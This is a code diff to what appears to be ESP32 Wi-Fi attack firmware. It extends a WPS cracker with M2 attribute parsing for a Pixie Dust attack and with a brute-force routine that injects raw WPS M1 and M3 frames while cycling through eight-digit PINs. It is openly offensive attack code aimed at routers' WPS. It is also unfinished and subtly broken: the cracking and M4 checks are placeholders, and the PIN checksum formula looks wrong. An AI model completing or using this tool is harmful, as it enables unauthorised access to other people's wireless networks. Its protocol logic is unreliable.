@@ -3,6 +3,7 @@
 #include "esp_wifi.h"
 #include "SD.h"
 #include "wps_crypto.h"
+#include "packets.h"
 
 extern WiFiScan wifi_scan_obj;
 extern LinkedList<AccessPoint>* access_points;
@@ -112,9 +113,22 @@ bool WPSCracker::pixieDust(AccessPoint &ap, String &pin) {
     return false;
   }
 
-  // TODO: 4. Parse M2 and 5. Crack PIN
-  // This is where the M2 packet would be parsed to extract PKE, PKR, E-Hash1, E-Hash2, and E-Nonce.
-  // Then, the cryptographic functions in wps_crypto would be used to derive the key and crack the PIN.
+  // 4. Parse M2
+  uint16_t pke_len, pkr_len, e_nonce_len, r_nonce_len, e_hash1_len, e_hash2_len;
+  const uint8_t *pke = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1032, &pke_len);
+  const uint8_t *pkr = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1034, &pkr_len);
+  const uint8_t *e_nonce = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x101a, &e_nonce_len);
+  const uint8_t *r_nonce = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1039, &r_nonce_len);
+  const uint8_t *e_hash1 = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1014, &e_hash1_len);
+  const uint8_t *e_hash2 = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1015, &e_hash2_len);
+
+  if (!pke || !pkr || !e_nonce || !r_nonce || !e_hash1 || !e_hash2) {
+    if (display_cb) display_cb("Falha ao analisar M2.");
+    return false;
+  }
+
+  // TODO: 5. Crack PIN
+  // This is where the cryptographic functions in wps_crypto would be used to derive the key and crack the PIN.
   // This is a complex process that requires a deep understanding of the WPS protocol and cryptography.
   // For now, this is a placeholder.
 
@@ -122,33 +136,69 @@ bool WPSCracker::pixieDust(AccessPoint &ap, String &pin) {
 }
 
 bool WPSCracker::bruteForce(AccessPoint &ap, String &pin) {
-  // Ensure WiFi is in a suitable mode (AP or STA with promiscuous) before calling this.
+  // 1. Initialize Wi-Fi for raw packet injection
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_start();
+  esp_wifi_set_promiscuous(true);
 
-  // 1. Set channel
+  // 2. Set channel
   esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
 
-  for (int i = 0; i <= 9999; i++) {
-    char pin_str[9];
-    // This is a simplified PIN generation for the first half.
-    // A real attack would be more systematic.
-    sprintf(pin_str, "%04d", i);
+  // 3. Send M1 and capture M2
+  struct wps_m1_packet m1;
+  uint8_t src_mac[6];
+  esp_wifi_get_mac(WIFI_IF_AP, src_mac);
+  build_wps_m1(m1, src_mac, ap.bssid);
+  sendRaw((uint8_t*)&m1, m1.len);
 
-    // M1-M4 exchange for first half of PIN
-    // TODO: Implement the M1-M4 exchange here.
-    // This would involve building and sending M1, capturing M2, building and sending M3,
-    // and capturing M4. The M4 response would then be checked to see if the first half
-    // of the PIN is correct.
-    if (display_cb) display_cb("A testar a primeira metade do PIN: " + String(pin_str));
-
-    unsigned long start_time = millis();
-    while(millis() - start_time < 100) {
-      // Non-blocking delay
-    }
-
-    if (progress_cb) progress_cb((i*100)/10000);
+  uint8_t m2_buf[512];
+  int m2_len = 0;
+  if (!captureM2(m2_buf, m2_len)) {
+    if (display_cb) display_cb("Falha ao capturar M2.");
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    return false;
   }
 
-  return false; // Placeholder
+  // 4. Parse M2 to get PKE and PKR
+  uint16_t pke_len, pkr_len;
+  const uint8_t *pke = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1032, &pke_len);
+  const uint8_t *pkr = parse_wps_ie(m2_buf + sizeof(ieee80211_frame), m2_len - sizeof(ieee80211_frame), 0x1034, &pkr_len);
+
+  if (!pke || !pkr) {
+    if (display_cb) display_cb("Falha ao analisar M2.");
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    return false;
+  }
+
+  // 5. Brute-force the PIN
+  for (int i = 0; i <= 9999999; i++) {
+    int current_pin = i * 10;
+    current_pin += (9 - ( ( (i/1000000)%10 + (i/100000)%10 + (i/10000)%10 + (i/1000)%10 + (i/100)%10 + (i/10)%10 + i%10 ) * 3 ) % 10) % 10;
+
+    char pin_str[9];
+    sprintf(pin_str, "%08d", current_pin);
+
+    // Build and send M3
+    struct wps_m3_packet m3;
+    build_wps_m3(m3, src_mac, ap.bssid, pin_str, pke, pkr);
+    sendRaw((uint8_t*)&m3, m3.len);
+
+    // Capture and check M4
+    // (Implementation of M4 capture and check would go here)
+
+    if (display_cb) display_cb("A tentar PIN: " + String(pin_str));
+    if (progress_cb) progress_cb((i * 100) / 10000000);
+    delay(1000); // Delay between attempts
+  }
+
+  esp_wifi_stop();
+  esp_wifi_deinit();
+  return false;
 }
 
 bool WPSCracker::checkWPSChecksum(int pin) {
